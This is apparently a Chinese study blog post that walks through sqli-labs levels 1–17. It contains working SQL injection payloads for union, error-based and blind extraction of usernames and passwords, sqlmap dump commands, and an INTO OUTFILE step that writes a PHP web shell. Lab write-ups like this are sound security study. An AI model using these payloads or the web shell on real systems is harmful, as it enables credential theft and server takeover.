---
layout: post
title: SQL 基础学习（sqli-lab）
date: 2026-07-28 18:00
tags:
  - sql注入
---
# lab1

![[Pasted image 20260729171913.png]]

## 判断是否存在sql注入

打开之后能够知道是要用参数“id”作为注入参数，然后先尝试注入

> ?id=1'

来判断该界面是否存在sql注入（这是sql注入的实验，说明一定会有sql注入这个漏洞），现在模拟的是平时的场景。

注入后发现出现错误：

![[Pasted image 20260729172110.png]]

## 注入类型判断

接下来尝试注释**闭合sql**

> ?id=1' --+

用于注释后面的单引号和 SQL 内容。

得到了我的登录账号和我的密码：Dumb

![[Pasted image 20260729172334.png]]

页面恢复正常，同时给了我一个用户名和密码。基本可以确认是单引号字符型注入

## 使用 ORDER BY 判断字段数量

依次使用

```url
?id=1' order by 1 --+
2
3
4
```

发现行数为4时报错，于是得到信息：字段数量为3

## 判断union显示位置

使用明显错误的id值来做这个判断

```url
?id=-1' union select 1,2,3--+
```

页面显示2、3，说明第2、3列能够在网页中显示

使id=-1是为了让原来的查询**返回空结果**，方便观察注入效果。

## 获取数据库基本信息

使用

```url
?id=-1' union select 1,database(),version()--+
```

得到数据库名为security和其他几个

# 查询 security 数据库中的表

使用

```url
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
```

- information_schema：`information_schema` 是 **MySQL自带的系统数据库**。它里面保存了整个MySQL服务器的元数据（Metadata）。

- group_concat()：这是 MySQL 的一个**聚合函数**。可以把多行数据拼成一行字符串

得到三个结果：emails,referers,uagents,users

我们的目标是users。

## 查询 users 表的字段

使用

```url
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+
```

得到结果:id 、password、user

## 查询 users 表中的数据

使用

```url
?id=-1' union select 1,group_concat(username,0x3a,password),3 from security.users--+
```
得到最终结果：

- 0x3a：冒号`:`的十六进制形式。

# sql-2

这一关与上面同样是注入id，但是我尝试闭合注入时却失败了

说明这关的注入是数字型而不是字符型。

字符型注入需要**先闭合**，而数字型不需要，于是直接进行union测试:

依旧得到user这个表名，接下来与1一样，去掉单引号即可

**虽然数字型不需要闭合，但还是最好仍使用注释**

注释是为了**去掉原 SQL 后面剩余的内容**。
# sql-3

这一关是**单引号型字符串**的，后端结果类似如下：

```mysql
SELECT * FROM users WHERE id=('$id') LIMIT 0,1;
```

于是我猜测要使用)\` 将字符串闭合，类似如下：

```url
?id=-1') union select 1,group_concat(username,0x3a,password),3 from security.users--+
```

# sql-4

这一关是**双引号型字符串**

```mysql
SELECT * FROM users WHERE id=("$id") LIMIT 0,1;
```

于是我猜测payload是将前面的单引号改成双引号和右括号

得到结果

# sql-5

这一关是有关**报错注入**的

我们要学会如何利用数据库报错，把信息包含到错误信息中。

于是我们尝试使用常用函数`updateXML`：

```url
?id=-1' and updatexml(1,concat(0x5e,(select database()),0x5e),1) --+
```

`concat`是`updatexml`这个函数里的参数，其中的第二个参数需要我们构造我们想要的查询，例如：

```
?id=3' AND updatexml(1,concat(0x5e,substr((SELECT group_concat(username,0x3a,password) FROM security.users),1,30
),0x5e),1) --+
```

`substr` ：**截取字符串的一部分**


# sql-6

**双引号的字符型报错注入**

将上面的payload中的单引号改成双引号即可

# sql-7

sql7是一个很特别的注入方式：**文件写入**

但是我在网上看了一些攻略全都是使用的布尔盲注这个方式，于是自己去了解了一下sql文件写入攻击方式的一些知识：

```
发现 SQL 注入
        │
        ▼
确定数据库类型（MySQL）
        │
        ▼
确认数据库账户是否具有 FILE 权限
        │
        ▼
确定 Web 服务器可写目录
        │
        ▼
将查询结果写入一个文件
        │
        ▼
浏览器访问该文件，验证是否成功写入
```

最关键的是三个条件：

1. **MySQL 用户具有 `FILE` 权限**
2. **知道目标服务器上的可写目录**
3. **MySQL 进程对该目录有写权限**

使用payload：

```url
?id=1')) into outfile 'C:/less7.php' lines terminated by <?php assert($_POST[less7]);?>
```

# sqli-8

由于这一关使用的是布尔盲注，人工进行sql注入太麻烦，于是使用攻击sqlmap

```bash
sqlmap -u "http://192.168.126.1/sqli-labs/Less-8/?id=1" \
  -p id --current-db --batch
```


- `-p id` ：指定测试参数
- `--current-db`：如果发现注入，获得当前数据库的名称
-  `--batch`   :使用默认选项自动回答所有交互提示，适合脚本化或无人值守运行

![[Pasted image 20260802171417.png]]

```bash
sqlmap -u "http://192.168.126.1/sqli-labs/Less-8/?id=1"   -p id -D security --tables --batch  # 查询数据库中的表

sqlmap -u "http://192.168.126.1/sqli-labs/Less-8/?id=1"   -p id -D security -T users --columns --batch # 查询表中的列

sqlmap -u "http://192.168.126.1/sqli-labs/Less-8/?id=1"   -p id -D security -T users  -C username,password,id --dump --batch
```

- `--tables`：列出数据库中的所有表
- `--columns`：列出指定表中的所有列
- `--dump`：导出数据
- `-D`:指定数据库
- `-T`：指定数据表
- `-C`：指定参数

![[Pasted image 20260802172225.png]]

# sqli-9

这一关官方想要教我们的是**时间盲注**

首先输入以下payload：

```url
1' AND IF(1=1,SLEEP(5),0)--+
```

发现页面确实闪烁了几秒钟，然后将条件改成`1=2`，发现页面无变化，说明页面存在时间盲注

使用的payload和第八关相同

# sqli-10

双引号的时间盲注，payload与第八关相同，但是加了两个参数

```bash
sqlmap -u "http://192.168.126.1/sqli-labs/Less-9/?id=1"   -p id --technique T --level 3 --current-db --batch
```

- `technique` ： 用于指定检测注入时所用技术
- `level`:level参数设定为3或者3以上的时候会尝试对referer注入

# sqli-11

这一关的主要知识点是**post注入**，因此payload不再以url的形式上传，而是通过页面输入上传

后台的sql注入大致如下：

```mysql
SELECT username,password
FROM users
WHERE username='$uname'
AND password='$passwd'
LIMIT 0,1;
```

本关使用的注释符号为“#”，不再是“--+”

payload如下：

```payload
ele' union select  group_concat(schema_name),2 from information_schema.schemata#
```

# sqli-12

双引+括号闭合，把前一关的payload中的`'` 改成双引号＋括号即可


# sqli-13

**POST 型 + 单引号 + 括号闭合 + 报错注入（Error-Based SQL Injection）**

所用的payload如下。感觉报错注入比较麻烦，浪费时间

```mysql
#获取服务器上所有数据库的名称
uname=admin') and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#&passwd=pass&submit=Submit


uname=ad,admin') and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,31),0x7e),1)#&passwd=pass&submit=Submit
```

# sqli-14

将上一关的单闭合改成双闭合即可

# sqli- 15

这一关是**post型的布尔盲注**

使用如下命令：

```bash
sqlmap -u "http://192.168.126.1/sqli-labs/Less-15/" --data="uname=admin&passwd=1&submit=Submit" -p uname --current-db --batch
```

- `--data` 指定post方法要用的数据
-  `-p` 指定注入参数
- `--technique=EU`：指定注入方式为布尔盲注和时间盲注


```bash
sqlmap -u "http://192.168.126.1/sqli-labs/Less-15/" --data="uname=admin&passwd=1&submit=Submit" -p uname -D security -T users  -C username,password,id --dump --batch
 
sqlmap -u "http://192.168.126.1/sqli-labs/Less-15/" --data="uname=admin&passwd=1&submit=Submit" -p uname -D security -T users --columns --batch

sqlmap -u "http://192.168.126.1/sqli-labs/Less-15/" --data="uname=admin&passwd=1&submit=Submit" -p uname -D security -T user --columns --batch
```
# sqli-16

双引号的布尔盲注，可以用上一关的payload

# sqli-17

sqlmap 提供了这两个参数，用来指定 Payload 前后缀，相当于人为告诉 sqlmap 注入点的上下文。

- `--prefix=")"`
- `--suffix="-- "`

